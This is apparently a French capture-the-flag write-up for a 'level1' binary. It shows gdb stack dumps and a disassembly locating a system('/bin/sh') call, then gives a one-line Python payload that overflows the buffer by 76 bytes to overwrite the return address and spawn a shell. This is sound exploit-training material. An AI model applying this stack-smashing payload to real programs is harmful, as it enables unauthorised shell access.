on ouvre le programme a l'aide de cutter pour voir la consctruction du binaire
et ensuite a l'aide de gdb on va recuperer l'address de la commande system(/bin/sh) contenu dans la fonction run du programme.
dans ce niveau on va ce contenter de reecrire EIP de la fin du main

(gdb) x/24 $esp
0xbffff6b0:	0xbffff6c0	0x0000002f	0xbffff70c	0xb7fd0ff4
0xbffff6c0:	0x080484a0	0x0804978c	0x00000001	0x08048321
0xbffff6d0:	0xb7fd13e4	0x00000016	0x0804978c	0x080484c1
0xbffff6e0:	0xffffffff	0xb7e5edc6	0xb7fd0ff4	0xb7e5ee55
0xbffff6f0:	0xb7fed280	0x00000000	0x080484a9	0xb7fd0ff4
0xbffff700:	0x080484a0	0x00000000	0x00000000	0xb7e454d3 <-- EIP to rewrite

							0xbffff6b0:	0xbffff6c0	0x0000002f	0xbffff70c	0xb7fd0ff4
-->	start of user input		0xbffff6c0:	0x41414141	0x41414141	0x41414141	0x41414141
							0xbffff6d0:	0x41414141	0x41414141	0x41414141	0x41414141
							0xbffff6e0:	0x41414141	0x41414141	0x41414141	0x41414141
							0xbffff6f0:	0x41414141	0x41414141	0x41414141	0x41414141
							0xbffff700:	0x41414141	0x00414141	0x00000000	0xb7e454d3


(gdb) disas run
Dump of assembler code for function run:
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	sub    $0x18,%esp
   0x0804844a <+6>:	mov    0x80497c0,%eax
   0x0804844f <+11>:	mov    %eax,%edx
   0x08048451 <+13>:	mov    $0x8048570,%eax
   0x08048456 <+18>:	mov    %edx,0xc(%esp)
   0x0804845a <+22>:	movl   $0x13,0x8(%esp)
   0x08048462 <+30>:	movl   $0x1,0x4(%esp)
   0x0804846a <+38>:	mov    %eax,(%esp)
   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:	movl   $0x8048584,(%esp)	<-- start of call system /bin/sh
   0x08048479 <+53>:	call   0x8048360 <system@plt>
   0x0804847e <+58>:	leave
   0x0804847f <+59>:	ret
End of assembler dump.

cat <(python -c "print('A' * 76 + '\x72\x84\x04\x08')") - | ./level1
